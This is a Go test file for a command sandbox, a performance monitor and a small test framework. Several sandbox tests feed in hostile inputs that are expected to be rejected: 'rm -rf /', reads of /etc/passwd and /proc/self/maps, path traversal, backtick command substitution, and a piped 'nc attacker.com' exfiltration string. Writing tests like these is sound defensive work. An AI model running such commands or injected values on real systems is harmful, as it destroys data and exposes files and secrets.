package services

import (
	"context"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNewSecuritySandbox(t *testing.T) {
	sandbox := NewSecuritySandbox()

	require.NotNil(t, sandbox)
	assert.NotNil(t, sandbox.allowedCommands)
	assert.Equal(t, 30*time.Second, sandbox.timeout)
	assert.Equal(t, 1024*1024, sandbox.maxOutputSize)
	assert.True(t, sandbox.allowedCommands["grep"])
	assert.True(t, sandbox.allowedCommands["ls"])
	assert.True(t, sandbox.allowedCommands["python3"])
}

func TestSecuritySandbox_ExecuteSandboxed_AllowedCommand(t *testing.T) {
	sandbox := NewSecuritySandbox()
	ctx := context.Background()

	t.Run("execute ls command", func(t *testing.T) {
		result, err := sandbox.ExecuteSandboxed(ctx, "ls", []string{"-la"})
		require.NoError(t, err)
		require.NotNil(t, result)
		assert.Equal(t, "ls", result.Command)
		assert.Equal(t, []string{"-la"}, result.Args)
	})

	t.Run("execute echo through allowed command", func(t *testing.T) {
		result, err := sandbox.ExecuteSandboxed(ctx, "grep", []string{"--version"})
		require.NoError(t, err)
		require.NotNil(t, result)
		assert.Equal(t, "grep", result.Command)
	})
}

func TestSecuritySandbox_ExecuteSandboxed_DisallowedCommand(t *testing.T) {
	sandbox := NewSecuritySandbox()
	ctx := context.Background()

	t.Run("disallowed command fails", func(t *testing.T) {
		result, err := sandbox.ExecuteSandboxed(ctx, "rm", []string{"-rf", "/"})
		assert.Error(t, err)
		assert.Nil(t, result)
		assert.Contains(t, err.Error(), "not allowed")
	})

	t.Run("curl command not allowed", func(t *testing.T) {
		result, err := sandbox.ExecuteSandboxed(ctx, "curl", []string{"http://example.com"})
		assert.Error(t, err)
		assert.Nil(t, result)
		assert.Contains(t, err.Error(), "not allowed")
	})

	t.Run("wget command not allowed", func(t *testing.T) {
		result, err := sandbox.ExecuteSandboxed(ctx, "wget", []string{"http://example.com"})
		assert.Error(t, err)
		assert.Nil(t, result)
		assert.Contains(t, err.Error(), "not allowed")
	})
}

func TestSecuritySandbox_ExecuteSandboxed_DangerousArguments(t *testing.T) {
	sandbox := NewSecuritySandbox()
	ctx := context.Background()

	t.Run("path traversal not allowed", func(t *testing.T) {
		result, err := sandbox.ExecuteSandboxed(ctx, "cat", []string{"../../../etc/passwd"})
		assert.Error(t, err)
		assert.Nil(t, result)
		assert.Contains(t, err.Error(), "dangerous argument")
	})

	t.Run("etc path not allowed", func(t *testing.T) {
		result, err := sandbox.ExecuteSandboxed(ctx, "cat", []string{"/etc/passwd"})
		assert.Error(t, err)
		assert.Nil(t, result)
		assert.Contains(t, err.Error(), "dangerous argument")
	})

	t.Run("proc path not allowed", func(t *testing.T) {
		result, err := sandbox.ExecuteSandboxed(ctx, "cat", []string{"/proc/self/maps"})
		assert.Error(t, err)
		assert.Nil(t, result)
		assert.Contains(t, err.Error(), "dangerous argument")
	})
}

func TestSecuritySandbox_ValidateToolExecution(t *testing.T) {
	sandbox := NewSecuritySandbox()

	t.Run("valid parameters", func(t *testing.T) {
		params := map[string]interface{}{
			"input":  "hello world",
			"count":  42,
			"active": true,
		}
		err := sandbox.ValidateToolExecution("test-tool", params)
		assert.NoError(t, err)
	})

	t.Run("semicolon in parameter not allowed", func(t *testing.T) {
		params := map[string]interface{}{
			"input": "command; rm -rf /",
		}
		err := sandbox.ValidateToolExecution("test-tool", params)
		assert.Error(t, err)
		assert.Contains(t, err.Error(), "dangerous parameter")
	})

	t.Run("pipe in parameter not allowed", func(t *testing.T) {
		params := map[string]interface{}{
			"input": "cat file | nc attacker.com",
		}
		err := sandbox.ValidateToolExecution("test-tool", params)
		assert.Error(t, err)
		assert.Contains(t, err.Error(), "dangerous parameter")
	})

	t.Run("backtick in parameter not allowed", func(t *testing.T) {
		params := map[string]interface{}{
			"input": "`whoami`",
		}
		err := sandbox.ValidateToolExecution("test-tool", params)
		assert.Error(t, err)
		assert.Contains(t, err.Error(), "dangerous parameter")
	})

	t.Run("non-string parameters are allowed", func(t *testing.T) {
		params := map[string]interface{}{
			"count":   100,
			"enabled": true,
			"ratio":   3.14,
		}
		err := sandbox.ValidateToolExecution("test-tool", params)
		assert.NoError(t, err)
	})
}

func TestNewPerformanceMonitor(t *testing.T) {
	monitor := NewPerformanceMonitor()

	require.NotNil(t, monitor)
	assert.NotNil(t, monitor.metrics)
}

func TestPerformanceMonitor_RecordMetric(t *testing.T) {
	monitor := NewPerformanceMonitor()

	t.Run("record metric", func(t *testing.T) {
		monitor.RecordMetric("test_metric", 42.5, map[string]string{"env": "test"})

		metric, exists := monitor.GetMetric("test_metric")
		require.True(t, exists)
		assert.Equal(t, "test_metric", metric.Name)
		assert.Equal(t, 42.5, metric.Value)
		assert.Equal(t, "test", metric.Labels["env"])
		assert.False(t, metric.Timestamp.IsZero())
	})

	t.Run("get non-existent metric", func(t *testing.T) {
		metric, exists := monitor.GetMetric("non_existent")
		assert.False(t, exists)
		assert.Nil(t, metric)
	})
}

func TestPerformanceMonitor_GetAllMetrics(t *testing.T) {
	monitor := NewPerformanceMonitor()

	monitor.RecordMetric("metric1", 1.0, nil)
	monitor.RecordMetric("metric2", 2.0, nil)
	monitor.RecordMetric("metric3", 3.0, nil)

	metrics := monitor.GetAllMetrics()
	assert.Len(t, metrics, 3)
	assert.Contains(t, metrics, "metric1")
	assert.Contains(t, metrics, "metric2")
	assert.Contains(t, metrics, "metric3")
}

func TestPerformanceMonitor_MonitorExecution(t *testing.T) {
	monitor := NewPerformanceMonitor()

	t.Run("successful execution", func(t *testing.T) {
		err := monitor.MonitorExecution("test_op", func() error {
			time.Sleep(10 * time.Millisecond)
			return nil
		})

		assert.NoError(t, err)

		durationMetric, exists := monitor.GetMetric("test_op_duration")
		require.True(t, exists)
		assert.True(t, durationMetric.Value > 0)

		successMetric, exists := monitor.GetMetric("test_op_success")
		require.True(t, exists)
		assert.Equal(t, 1.0, successMetric.Value)
	})

	t.Run("failed execution", func(t *testing.T) {
		err := monitor.MonitorExecution("failing_op", func() error {
			return assert.AnError
		})

		assert.Error(t, err)

		errorMetric, exists := monitor.GetMetric("failing_op_errors")
		require.True(t, exists)
		assert.Equal(t, 1.0, errorMetric.Value)
	})
}

func TestNewTestingFramework(t *testing.T) {
	framework := NewTestingFramework()

	require.NotNil(t, framework)
	assert.NotNil(t, framework.sandbox)
	assert.NotNil(t, framework.monitor)
	assert.NotNil(t, framework.testCases)
}

func TestTestingFramework_AddTestCase(t *testing.T) {
	framework := NewTestingFramework()

	framework.AddTestCase("test1", "Test description", func() error {
		return nil
	})

	assert.Len(t, framework.testCases, 1)
	assert.Contains(t, framework.testCases, "test1")
	assert.Equal(t, "Test description", framework.testCases["test1"].Description)
}

func TestTestingFramework_RunTests(t *testing.T) {
	framework := NewTestingFramework()
	ctx := context.Background()

	t.Run("all tests pass", func(t *testing.T) {
		framework.AddTestCase("passing1", "Passing test 1", func() error {
			return nil
		})
		framework.AddTestCase("passing2", "Passing test 2", func() error {
			return nil
		})

		results := framework.RunTests(ctx)

		assert.Equal(t, 2, results.Total)
		assert.Equal(t, 2, results.Passed)
		assert.Equal(t, 0, results.Failed)
		assert.Empty(t, results.Errors)
		assert.True(t, results.Duration > 0)
	})

	t.Run("some tests fail", func(t *testing.T) {
		newFramework := NewTestingFramework()
		newFramework.AddTestCase("failing", "Failing test", func() error {
			return assert.AnError
		})
		newFramework.AddTestCase("passing", "Passing test", func() error {
			return nil
		})

		results := newFramework.RunTests(ctx)

		assert.Equal(t, 2, results.Total)
		assert.Equal(t, 1, results.Passed)
		assert.Equal(t, 1, results.Failed)
		assert.Len(t, results.Errors, 1)
	})
}

func TestResourceLimits(t *testing.T) {
	limits := ResourceLimits{
		MaxCPU:    "500m",
		MaxMemory: "256Mi",
		MaxDisk:   "100Mi",
	}

	assert.Equal(t, "500m", limits.MaxCPU)
	assert.Equal(t, "256Mi", limits.MaxMemory)
	assert.Equal(t, "100Mi", limits.MaxDisk)
}

func TestSandboxedResult(t *testing.T) {
	result := &SandboxedResult{
		Command:   "ls",
		Args:      []string{"-la"},
		Output:    "file1.txt\nfile2.txt",
		Success:   true,
		Truncated: false,
	}

	assert.Equal(t, "ls", result.Command)
	assert.Equal(t, []string{"-la"}, result.Args)
	assert.True(t, result.Success)
	assert.False(t, result.Truncated)
}

func BenchmarkSecuritySandbox_ValidateToolExecution(b *testing.B) {
	sandbox := NewSecuritySandbox()
	params := map[string]interface{}{
		"input":  "hello world",
		"count":  42,
		"active": true,
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = sandbox.ValidateToolExecution("test-tool", params)
	}
}

func BenchmarkPerformanceMonitor_RecordMetric(b *testing.B) {
	monitor := NewPerformanceMonitor()
	labels := map[string]string{"env": "test"}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		monitor.RecordMetric("test_metric", float64(i), labels)
	}
}
